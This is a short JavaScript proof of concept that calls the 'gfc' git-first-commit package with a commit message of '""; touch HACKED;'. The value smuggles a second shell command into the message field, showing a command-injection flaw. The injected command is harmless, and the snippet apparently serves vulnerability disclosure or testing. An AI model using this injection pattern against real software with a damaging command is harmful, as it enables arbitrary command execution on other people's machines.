const firstCommit = require("gfc");
const options = { message: '""; touch HACKED;' };
firstCommit(".", options, function (err) {});
